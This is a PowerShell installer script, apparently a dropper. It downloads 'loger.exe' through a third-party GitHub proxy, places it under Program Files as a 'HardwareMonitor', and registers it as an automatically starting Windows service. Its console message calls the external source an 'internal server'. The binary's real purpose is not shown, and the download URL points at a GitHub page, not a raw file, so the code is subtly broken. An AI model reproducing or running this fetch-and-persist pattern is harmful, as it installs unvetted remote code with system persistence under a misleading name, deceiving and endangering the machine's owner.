try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13
} catch {
    Write-Warning "Could not configure security protocols. Using system defaults."
}

$DownloadUrl        = "https://gh-proxy.org/https://github.com/Xramas/loger/blob/master/loger.exe"
$TargetDirectory    = "C:\Program Files\HardwareMonitor"
$BinaryPath         = Join-Path $TargetDirectory "loger.exe"
$ServiceName        = "LogerHardwareMonitor"
$ServiceDisplayName = "Loger Hardware Monitor Service"

try {
    if (-not (Test-Path $TargetDirectory)) {
        New-Item -ItemType Directory -Path $TargetDirectory -Force | Out-Null
        Write-Host "Installation directory created: $TargetDirectory"
    }

    Write-Host "Downloading application from internal server..."
    Invoke-WebRequest -Uri $DownloadUrl -OutFile $BinaryPath -UseBasicParsing
    Write-Host "Download completed: $BinaryPath"
} catch {
    Write-Error "Download or directory creation failed: $_"
    exit
}

try {
    if (Get-Service -Name $ServiceName -ErrorAction SilentlyContinue) {
        Write-Host "Service [$ServiceName] already exists. Checking status..."
    } else {
        Write-Host "Creating system service..."
        New-Service -Name $ServiceName `
                    -BinaryPathName "`"$BinaryPath`"" `
                    -DisplayName $ServiceDisplayName `
                    -StartupType Automatic
        Write-Host "Service created successfully."
    }

    $ServiceStatus = Get-Service -Name $ServiceName
    if ($ServiceStatus.Status -ne "Running") {
        Write-Host "Starting hardware monitor service..."
        Start-Service -Name $ServiceName
        Write-Host "Service started successfully and is running in the background."
    } else {
        Write-Host "Service is already running."
    }
} catch {
    Write-Error "Service registration or startup failed: $_"
}
